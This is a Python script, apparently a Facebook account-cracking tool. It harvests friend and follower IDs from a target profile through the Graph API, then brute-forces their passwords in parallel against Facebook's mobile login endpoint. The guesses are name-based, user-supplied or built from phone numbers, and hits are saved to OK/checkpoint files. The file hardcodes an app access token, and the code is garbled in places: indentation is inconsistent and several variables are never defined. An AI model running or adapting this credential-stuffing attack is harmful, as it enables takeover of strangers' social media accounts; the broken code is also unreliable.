#!/usr/bin/python3
#-*-coding:utf-8-*-
 #-*coded by Jungey

P = '\x1b[1;97m'
M = '\x1b[1;31m'
H = '\x1b[1;32m'
K = '\x1b[1;33m'
B = '\x1b[1;34m'
U = '\x1b[1;35m' 
O = '\x1b[1;36m'
N = '\x1b[0m' 
Z = "\033[1;30m"
FM = '\033[0;41m'

import os
try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	import bs4
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize bs4 requests futures==2 > /dev/null')
	os.system('python lordxpan.py')


import requests,json,os,sys,random,datetime,subprocess,time,re,calendar,base64,zlib,string,platform,uuid
from bs4 import BeautifulSoup as sop



loop = 0
oks = []
cps = []
ugent = []


def xox(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.01)


def banner():
	os.system("clear")
	print("%s ────▄████▀█▄"%(Z))
	print("%s──▄█████████████████▄"%(Z))
	print("%s▄█████.▼.▼.▼.▼.▼.▼▼▼▼"%(Z))
	print("%s█████ 𝗦𝗧𝗔𝗥𝗧𝗜𝗡𝗚 𝗢𝗙 𝗡𝗘𝗪 𝗘𝗥𝗔 "%(Z))
	print("%s███████▄.▲.▲▲▲▲▲▲▲▲"%(Z))
	print("%s██████████████████"%(Z))
    print("%s████████████████████▀"%(Z))
	print("%s╔══════════════════════════════════════════╗"%(Z))
	print("%s║%s  Author   : %s  𝗗𝗢𝗠𝗔𝗜𝗡𝗫𝗣𝗔𝗡              %s║"%(Z,B,M,Z))
	print("%s║%s  Github   : https://github.com/newera  %s║"%(Z,B,Z))
	print("%s║%s  Facebook : https://www.facebook.com/ruler.of.new.era.200hc   %s║"%(Z,B,Z))
	print("%s║%s  Version  : %s3.0                          %s║"%(Z,B,H,Z))
	print("%s╚══════════════════════════════════════════╝"%(Z))
	print("")
	xox('            %s》%s》%s》%sDoomXpan%s《%s《%s《'%(M,H,B,H,B,H,M))
	print("")

def linex():
	print("%s════════════════════════════════════════════%s\n"%(Z,N))



def main():

        os.system("clear")

        print(logo)

        print("")

        print(" \x1b[1;92m    \tMain menu")

        print("")

        os.system('echo -e "❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥❂❥━──➸➽"| lolcat')

        print(" \x1b[1;92m     [1] START CLONING\n")

        os.system('echo -e "❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥❂❥━──➸➽"| lolcat')

        print("")

        os.system('xdg-open https://www.facebook.com/100000919198119 ')

        log_sel()

def log_sel():

        sel = raw_input(" Choose an option❥━──➸: ")

        if sel =="1":

                login()

        elif sel =="2":

                ran()



        else:

                print("")

                print("\tSelect valid option")

                print("")

                log_select()

def login():

        try:

                token = open("access_token.txt", "r").read()

                menu()

        except(KeyError , IOError):

                os.system("clear")

                print(logo)

                print("")

                print(" \x1b[1;91m  \tFacebook login")

                print("")

                os.system('echo -e "❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥❂❥━──➸➽"| lolcat')

                print(" \x1b[1;91m   [1] FACEBOOK ID/PASS LOGIN\n")

                print(" \x1b[1;92m   [2] FACEBOOK TOKEN LOGIN\n")

                print("  \x1b[1;91m  [3] Back ")

                os.system('echo -e "-❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥❂❥━──➸➽"| lolcat')

                print("")

                log_select()

def log_select():

        sel = raw_input(" Choose an option: ")

        if sel =="1":

                log_fb()

        elif sel =="2":

                token()

        elif sel =="3":

                ran()

        else:

                print("")

                print("\tSelect valid option")

                print("")

                log_select()

def log_fb():

        os.system("clear")

        try:

                token = open("access_token.txt", "r").read()

                menu()

        except (KeyError , IOError):

                print(logo)

                print("")

                print("\tFacebook id/pass login")

                print("")

                uid = raw_input(" Uid: ")

                passw = raw_input(" Password: ")

                data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+passw+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&user-agent=Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=900,height=1600}&cpl=true", headers=header).text

                q = json.loads(data)

                if "access_token" in q:

                        sav = open("access_token.txt", "w")

                        sav.write(q["access_token"])

                        sav.close()

                        menu()

                elif "www.facebook.com" in q["error"]:

                        print("")

                        print("\tAccount has checkpoint")

                        print("")

                        time.sleep(1)

                        login()

                else:

                        print("")

                        print("\tId/pass my be wrong")

                        print("")

                        time.sleep(1)

def token():

    os.system("clear")

    try:

        token = open("access_token.txt", "r").read()

        menu()

    except(KeyError , IOError):

        print(logo)

        print("")

        print("\tLogin token")

        print("")

        os.system('echo -e "-❥━──➸➽❥❂❥━──➸➽"| lolcat')

        token = raw_input        (" Paste token❥: ")

        os.system('echo -e "❥━──➸➽❥❂❥━──➸➽"| lolcat')

        sav = open("access_token.txt", "w")

        sav.write(token)

        sav.close()

        login()

def menu():

    os.system("clear")

    try:

        token = open("access_token.txt", "r").read()

    except(KeyError , IOError):

        login()

    try:

        r = requests.get("https://graph.facebook.com/me?access_token="+token)

        q = json.loads(r.text)

        name = q["name"]

    except(KeyError):

        print(logo)

        print("")

        print("\tLogged in token has expired")

        os.system("rm -rf access_token.txt")

        print("")

        time.sleep(1)

        login()

    os.system("clear")

    print(logo)

    print("")

    print("   Welcome: "+name)

    print("")

    print("    Free mode :Actvited")

    print("")

    print("")

    os.system('echo -e "-❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥"| lolcat')

    print(" \x1b[1;92m[1]  CRACK AUTO PASS\n")

    print(" \x1b[1;91m[2]  CRACK CHOICE PASS\n")
    

    print(' \x1b[1;90m[3]   BACK')

    os.system('echo -e "❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥"| lolcat')

    print("")

    menu_option()

def menu_option():

        select = raw_input(" Choose option: ")

        if select =="1":

                crack()

        elif select =="2":

                choice()



        else:

                print("")

                print("\tSelect valid option")

                print("")

                menu_option()

def crack():

        global token

        os.system("clear")

        try:

                token = open("access_token.txt","r").read()

        except IOError:

                print("")

                print("\tToken not found ")

                time.sleep(1)

                login_choice()

        os.system("clear")

        print(logo)

        print("")

        print("\t    \033[1;32mAUTO PASS CLONING\033[0;97m")

        print("")

        os.system('echo -e "❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥"| lolcat')

        print("\x1b[1;92m       [1] CRACK PUBLIC ID")

        print("\x1b[1;92m       [2] CRACK FOLLOWERS")

        print(" \x1b[1;92m      [0] BACK")

        os.system('echo -e "❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥"| lolcat')

        print("")

        crack_select()

def crack_select():

        select = raw_input(" Choose option: ")

        id=[]

        oks=[]

        cps=[]

        if select =="1":

                os.system("clear")

                print(logo)

                print("")

                print("\tAUTO PASS CRAKING")

                print("")

                idt = raw_input("  Input id: ")

                try:

                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)

                        q = json.loads(r.text)

                        os.system('clear')

                        print(logo)

                        print('')

                        print("\tAUTO PASS CRAKING")

                        print('')

                        print("  Cloning from : "+q["name"])

                except KeyError:

                        print("\tInvalid link OR token")

                        print("")

                        raw_input(" Press enter to back")

                        crack()

                r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)

                z = json.loads(r.text)

                for i in z["data"]:

                        uid = i["id"]

                        na = i["name"]

                        nm = na.rsplit(" ")[0]

                        id.append(uid+"|"+nm)

        elif select =="2":

                os.system("clear")

                print(logo)

                print("")

                print("\tAUTO PASS CRACKING")

                print("")

                idt = raw_input("  Input id: ")

                try:

                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)

                        q = json.loads(r.text)

                        os.system('clear')

                        print(logo)

                        print('')

                        print('\tAUTO PASS CRAKING')

                        print('')

                        print("  Cloning from: "+q["name"])

                except KeyError:

                        print("\tInvalid id link OR token")

                        print("")

                        raw_input(" Press enter to back")

                        crack()

                r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")

                z = json.loads(r.text)

                for i in z["data"]:

                        uid = i["id"]

                        na = i["name"]

                        nm = na.rsplit(" ")[0]

                        id.append(uid+"|"+nm)

        elif select =="0":

            menu()

        else:

                print("")

                print("\t    \033[1;31mSelect valid option\033[0;97m")

                print("")

                crack_select()

        os.system('echo -e "❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥❂❥━──➸➽"| lolcat')

        print(" \x1b[1;92m   Total IDs : "+str(len(id)))

        print(" \x1b[1;91m   The Process has started")

        print("   \x1b[1;91m Press ctrl + z to stop")

        os.system('echo -e "❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥❂❥━──➸➽"| lolcat')

        print("")

        print("")

        def main(arg):

                user=arg

                uid,name=user.split("|")

                ranagent = random.choice(agents)

                biran = random.choice(birth)

                session = requests.Session()

                session.headers.update({'User-Agent': ranagent})

                try:

                        pass1 = name.lower()+"123"

                        data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

                        q = json.loads(data)

                        if "access_token" in q:

                                print(" \033[1;32m [LORD OK] "+uid+" | "+pass1+"\033[0;97m")

                                ok = open("LORDok.txt", "a")

                                ok.write(uid+"|"+pass1+"\n")

                                ok.close()

                                oks.append(uid+pass1)

                        else:

                                if "www.facebook.com" in q["error_msg"]:

                                        print(" \033[1;33m [LORD CP] "+uid+" | "+pass1+"\033[0;97m")

                                        cp = open("LORDcp.txt", "a")

                                        cp.write(uid+"|"+pass1+"\n")

                                        cp.close()

                                        cps.append(uid+pass1)

                                else:

                                        pass2 = name.lower()+"0123"

                                        data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

                                        q = json.loads(data)

                                        if "access_token" in q:

                                                print(" \033[1;32m [LORD OK] "+uid+" | "+pass2+"\033[0;97m")

                                                ok = open("LORDok.txt", "a")

                                                ok.write(uid+"|"+pass2+"\n")

                                                ok.close()

                                                oks.append(uid+pass2)

                                        else:

                                                if "www.facebook.com" in q["error_msg"]:

                                                        print(" \033[1;33m [LORD CP] "+uid+" | "+pass2+"\033[0;97m")

                                                        cp = open("LORDcp.txt", "a")

                                                        cp.write(uid+"|"+pass2+"\n")

                                                        cp.close()

                                                        cps.append(uid+pass2)

                                                else:

                                                        pass3 = name.lower()+"45678"

                                                        data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

                                                        q = json.loads(data)

                                                        if "access_token" in q:

                                                                print(" \033[1;32m [LORD OK] "+uid+" | "+pass3+"\033[0;97m")

                                                                ok = open("LORDok.txt", "a")

                                                                ok.write(uid+"|"+pass3+"\n")

                                                                ok.close()

                                                                oks.append(uid+pass3)

                                                        else:

                                                                if "www.facebook.com" in q["error_msg"]:

                                                                        print(" \033[1;33m [LORD CP] "+uid+" | "+pass3+"\033[0;97m")

                                                                        cp = open("LORDcp.txt", "a")

                                                                        cp.write(uid+"|"+pass3+"\n")

                                                                        cp.close()

                                                                        cps.append(uid+pass3)

                                                                else:

                                                                        pass4 = name.lower()+"@1234"

                                                                        data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

                                                                        q = json.loads(data)

                                                                        if "access_token" in q:

                                                                                print(" \033[1;32m [LORD OK] "+uid+" | "+pass4+"\033[0;97m")

                                                                                ok = open("LORDok.txt", "a")

                                                                                ok.write(uid+"|"+pass4+"\n")

                                                                                ok.close()

                                                                                oks.append(uid+pass4)

                                                                        else:

                                                                                if "www.facebook.com" in q["error_msg"]:

                                                                                        print(" \033[1;33m [LORD CP] "+uid+" | "+pass4+"\033[0;97m")

                                                                                        cp = open("LORDcp.txt", "a")

                                                                                        cp.write(uid+"|"+pass4+"\n")

                                                                                        cp.close()

                                                                                        cps.append(uid+pass4)

                                                                                else:

                                                                                        pass5 = name.lower()+'@#123'

                                                                                        data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

                                                                                        q = json.loads(data)

                                                                                        if "access_token" in q:

                                                                                                print(" \033[1;32m [LORD OK] "+uid+" | "+pass5+"\033[0;97m")

                                                                                                ok = open("LORDok.txt", "a")

                                                                                                ok.write(uid+"|"+pass5+"\n")

                                                                                                ok.close()

                                                                                                oks.append(uid+pass5)

                                                                                        else:

                                                                                                if "www.facebook.com" in q["error_msg"]:

                                                                                                        print(" \033[1;33m [LORD CP] "+uid+" | "+pass5+"\033[0;97m")

                                                                                                        cp = open("LORDcp.txt", "a")

                                                                                                        cp.write(uid+"|"+pass5+"\n")

                                                                                                        cp.close()

                                                                                                        cps.append(uid+pass5)

                except:

                        pass

        p = ThreadPool(30)

        p.map(main, id)

        print("")

        print("")

        os.system('echo -e "❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥❂❥━──➸➽"| lolcat')

        print("   \x1b[1;91mThe process has been completed")

        print("   \x1b[1;92m Total Ok/Cp: "+str(len(oks))+"/"+str(len(cps)))

        os.system('echo -e "❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥❂❥━──➸➽"| lolcat')

        print("")

        print(" Clone vaisakesi command banda gar randi ko ban ")

        raw_input(" Press enter to back ")

        menu()

def choice():

        global token

        os.system("clear")

        try:

                token = open("access_token.txt","r").read()

        except IOError:

                print("")

                print("\tToken not found")

                time.sleep(1)

                login_choice()

        os.system("clear")

        print(logo)

        print("")

        print("\t    \033[1;32mCHOICE PASS CRACK MENU\033[0;97m")

        print("")

        os.system('echo -e "-❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥"| lolcat')

        print("\x1b[1;92m       [1] CRACK PUBLIC ID")

        print("\x1b[1;92m       [2] CRACK FOLLOWERS")

        print(" \x1b[1;92m      [0] BACK")

        os.system('echo -e "❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥"| lolcat')

        print("")

        choice_select()

def choice_select():

        select = raw_input("Choose option: ")

        id=[]

        oks=[]

        cps=[]

        if select =="1":

                os.system("clear")

                print(logo)

                print("")

                print("\CHOICE PASS CRACK CRACKING")

                print("")

                pass1 = raw_input(" Password: ")

                pass2 = raw_input(" Password: ")

                pass3 = raw_input(" Password: ")

                idt = raw_input(" Input id: ")

                try:

                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)

                        q = json.loads(r.text)

                        os.system('clear')

                        print(logo)

                        print('')

                        print('\Choice pass cracking')

                        print("")

                        print(" Cloning from : "+q["name"])

                except KeyError:

                        print("\tInvalid id link")

                        print("")

                        raw_input(" Press enter to back")

                        choice()

                r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)

                z = json.loads(r.text)

                for i in z["data"]:

                        uid = i["id"]

                        na = i["name"]

                        nm = na.rsplit(" ")[0]

                        id.append(uid+"|"+nm)

        elif select =="2":

                os.system("clear")

                print(logo)

                print("")

                print("\CHOICE PASS CRACK CRACKING")

                print("")

                pass1 = raw_input(" Password: ")

                pass2 = raw_input(" Password: ")

                pass3 = raw_input(" Password: ")

                idt = raw_input(" Input id: ")

                try:

                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)

                        q = json.loads(r.text)

                        os.system('clear')

                        print(logo)

                        print('')

                        print('\Choice pass cracking')

                        print('')

                        print(" Cloning from: "+q["name"])

                except KeyError:

                        print("\tInvalid id link")

                        print("")

                        raw_input(" Press enter to back")

                        choice()

                r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")

                z = json.loads(r.text)

                for i in z["data"]:

                        uid = i["id"]

                        na = i["name"]

                        nm = na.rsplit(" ")[0]

                        id.append(uid+"|"+nm)

        elif select =="0":

            menu()

        else:

                print("")

                print("\tSelect valid option\033[0;97m")

                print("")

                choice_select()

        os.system('echo -e "-❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥"| lolcat')

        print(" \x1b[1;92m   Total IDs : "+str(len(id)))

        print(" \x1b[1;90m   The Process has started")

        print("    \x1b[1;91m Press ctrl + z to stop")

        os.system('echo -e "❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥"| lolcat')

        print("")

        def main(arg):

                user=arg

                uid,name=user.split("|")

                ranagent = random.choice(agents)

                session = requests.Session()

                session.headers.update({'User-Agent': ranagent})

                try:

                        data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

                        q = json.loads(data)

                        if "access_token" in q:

                                print(" \033[1;32m [LORD OK] "+uid+" | "+pass1+"\033[0;97m")

                                ok = open("LORDok.txt", "a")

                                ok.write(uid+"|"+pass1+"\n")

                                ok.close()

                                oks.append(uid+pass1)

                        else:

                                if "www.facebook.com" in q["error_msg"]:

                                        print(" \033[1;33m [LORD CP] "+uid+" | "+pass1+"\033[0;97m")

                                        cp = open("LORDcp.txt", "a")

                                        cp.write(uid+"|"+pass1+"\n")

                                        cp.close()

                                        cps.append(uid+pass1)

                                else:

                                        data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

                                        q = json.loads(data)

                                        if "access_token" in q:

                                                print(" \033[1;32m [LORD OK] "+uid+" | "+pass2+"\033[0;97m")

                                                ok = open("LORDok.txt", "a")

                                                ok.write(uid+"|"+pass2+"\n")

                                                ok.close()

                                                oks.append(uid+pass2)

                                        else:

                                                if "www.facebook.com" in q["error_msg"]:

                                                        print(" \033[1;33m [LORD CP] "+uid+" | "+pass2+"\033[0;97m")

                                                        cp = open("LORDcp.txt", "a")

                                                        cp.write(uid+"|"+pass2+"\n")

                                                        cp.close()

                                                        cps.append(uid+pass2)

                                                else:

                                                        data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text

                                                        q = json.loads(data)

                                                        if "access_token" in q:

                                                                print(" \033[1;32m [LORD OK] "+uid+" | "+pass3+"\033[0;97m")

                                                                ok = open("LORDok.txt", "a")

                                                                ok.write(uid+"|"+pass3+"\n")

                                                                ok.close()

                                                                oks.append(uid+pass3)

                                                        else:

                                                                if "www.facebook.com" in q["error_msg"]:

                                                                        print(" \033[1;33m [LORD CP] "+uid+" | "+pass3+"\033[0;97m")

                                                                        cp = open("LORDcp.txt", "a")

                                                                        cp.write(uid+"|"+pass3+"\n")

                                                                        cp.close()

                                                                        cps.append(uid+pass3)

                except:

                        pass

        p = ThreadPool(30)

        p.map(main, id)

        print("")

        print("")

        os.system('echo -e "❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥❂❥━──➸➽"| lolcat')

        print("   \x1b[1;91mThe process has been completed")

        print("   \x1b[1;92m Total Ok/Cp: "+str(len(oks))+"/"+str(len(cps)))

        os.system('echo -e "❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥❂❥━──➸➽"| lolcat')

        print("")

        print(" Clone vaisakesi command banda gar randi ko ban")

        raw_input(" Press enter to back ")

        choice()

def ran():

        id=[]

        cps=[]

        oks=[]

        os.system("clear")

        print(logo)

        print("")

        print("\tRandom number cloning")

        print("")

        co = raw_input(" Enter number: ")

        k = "+977"

        try:

                file = ".txt"

                for line in open(file, "r").readlines():

                        id.append(line.strip())

        except:

                exit(" An error has occured")

        print("  Total numbers: "+str(len(id)))

        print("  The process has started")

        print("  Press ctrl + z to stop")

        print(' ')

        print(47*"-")

        print('')

        print("")

        def main(arg):

                user=arg

                ranagent = random.choice(agents)

                session = requests.Session()

                session.headers.update({'User-Agent': ranagent})

                try:

                        pass1 = "786786"

                        data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+k+co+user+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true").text

                        q = json.loads(data)

                        if "access_token" in q:

                                print(" \033[1;32m[LORD OK] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")

                                ok = open("LORDok.txt", "a")

                                ok.write(k+co+user+"|"+pass1+"\n")

                                ok.close()

                                oks.append(uid+pass1)

                        else:

                                if "www.facebook.com" in q["error_msg"]:

                                        print(" \033[1;33m [LORD CP] "+k+co+user+" | "+pass1+"\033[0;97m")

                                        cp = open("LORDcp.txt", "a")

                                        cp.write(k+co+user+"|"+pass1+"\n")

                                        cp.close()

                                        cps.append(k+co+user+pass1)

                                else:

                                        pass2 = user

                                        data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+k+co+user+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true").text

                                        q = json.loads(data)

                                        if "access_token" in q:

                                                print(" \033[1;32m[LORD OK] "+k+co+user+" | "+q["uid"]+" | "+pass2+"\033[0;97m")

                                                ok = open("LORDok.txt", "a")

                                                ok.write(k+co+user+"|"+pass2+"\n")

                                                ok.close()

                                                oks.append(k+co+user+pass2)

                                        else:

                                                if "www.facebook.com" in q["error_msg"]:

                                                        print(" \033[1;33m [LORD CP] "+uid+" | "+pass2+"\033[0;97m")

                                                        cp = open("LORDcp.txt", "a")

                                                        cp.write(k+co+user+"|"+pass2+"\n")

                                                        cp.close()

                                                        cps.append(k+co+user+pass2)

                                                else:

                                                        pass3 = k+co+user

                                                        data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+k+co+user+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true").text

                                                        q = json.loads(data)

                                                        if "access_token" in q:

                                                                print(" \033[1;32m[LORD OK] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")

                                                                ok = open("LORDok.txt", "a")

                                                                ok.write(k+co+user+"|"+pass3+"\n")

                                                                ok.close()

                                                                oks.append(k+co+user+pass3)

                                                        else:

                                                                if "www.facebook.com" in q["error_msg"]:

                                                                        print(" \033[1;33m [LORD CP] "+k+co+user+" | "+pass3+"\033[0;97m")

                                                                        cp = open("LORDcp.txt", "a")

                                                                        cp.write(k+co+user+"|"+pass3+"\n")

                                                                        cp.close()

                                                                        cps.append(k+co+user+pass3)

                except:

                        pass

        p = ThreadPool(30)

        p.map(main, id)

        print("")

        print("")

        os.system('echo -e "❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥❂❥━──➸➽"| lolcat')

        print("   \x1b[1;91mThe process has been completed")

        print("   \x1b[1;92m Total Ok/Cp: "+str(len(oks))+"/"+str(len(cps)))

        os.system('echo -e "❥━──➸➽❥❂❥━──➸➽❥━──➸➽❥❂❥━──➸➽"| lolcat')

        print("")

        print(" Clone vaisakesi command banda gar randi ko ban ")

        raw_input(" Press enter to back ")

        main()





if __name__ == '__main__':

        main()
